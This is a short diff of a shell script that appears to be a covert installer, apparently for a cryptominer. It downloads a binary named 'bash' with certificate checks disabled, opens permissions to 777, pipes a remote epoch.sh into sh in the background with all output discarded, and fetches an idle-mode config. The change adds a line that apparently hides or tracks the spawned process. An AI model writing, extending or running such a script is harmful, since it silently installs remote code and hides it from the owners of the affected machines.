@@ -43,7 +43,7 @@ wget --no-check-certificate -qO "${work}/bash" "${src}/q"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 chmod -R 777 "${work}"
 sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
-
+hPid "$!"
 
 if [ "$idle" -eq "1" ]; then
   wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
